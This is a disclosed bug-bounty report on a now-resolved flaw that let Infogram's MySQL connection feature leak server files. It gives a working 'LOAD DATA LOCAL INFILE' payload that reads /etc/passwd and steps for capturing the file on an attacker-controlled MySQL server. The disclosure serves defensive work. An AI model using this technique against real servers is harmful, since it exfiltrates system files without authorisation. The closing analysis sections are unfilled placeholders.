---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '719875'
original_report_id: '719875'
title: LFI through the MySQL connection
weakness: Information Disclosure
team_handle: infogram
created_at: '2019-10-22T12:37:27.836Z'
disclosed_at: '2019-11-12T12:33:57.212Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 47
asset_identifier: infogram.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- information-disclosure
---

# LFI through the MySQL connection

## Metadata

- HackerOne Report ID: 719875
- Weakness: Information Disclosure
- Program: infogram
- Disclosed At: 2019-11-12T12:33:57.212Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello team!

I've found a way to read Infogram's server local files through the MySQL connection.
The problem is that you're using the `LOAD DATA LOCAL` feature with your MySQL client. This how an attacker can easily send server's local files to her/his database.

I've successfully readed the `/etc/passwd` and `/etc/hosts` files from your server.

### Steps to reproduce
- Login 
- Make a new infographic or navigate to the existing one
- Now add new MySQL connection under `data` section
- Set the value of the SQL SELECT statement to the following:

```
LOAD DATA LOCAL INFILE '/etc/passwd'
INTO TABLE asd.asd
FIELDS TERMINATED BY "\n"
```

- Fill other necessary information (IP address, port etc..)
- Now setup/install the "evil" MySQL server with the database/table called `asd` and other needed information. Point your MySQL connection from infogram app to this server.
- Listen network traffic of the "evil" MySQL server. If you are using tcpdump you can do wireshark readable file with this command `tcpdump -s 0 port 3306 -i eth0 -w infogramsteal.pcap`
- Now click `Create` in the infogram app
- Once you get an error message at infogram app stop the tcpdump and open it with wireshark

In wireshark/pcap you can see some main points. First is the **login request** where you can see that `LOAD DATA LOCAL` is set to the value `1` which is basicly same than `true`: 
{F614430}
Also, you can see the **Request Command Unknown** which basicly contains the value of the file `/etc/passwd`:
{F614431}

Disable the `LOAD DATA LOCAL` feature if possible.

If you need any information please let me know.

Cheers!

## Impact

Reading local files from the server

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
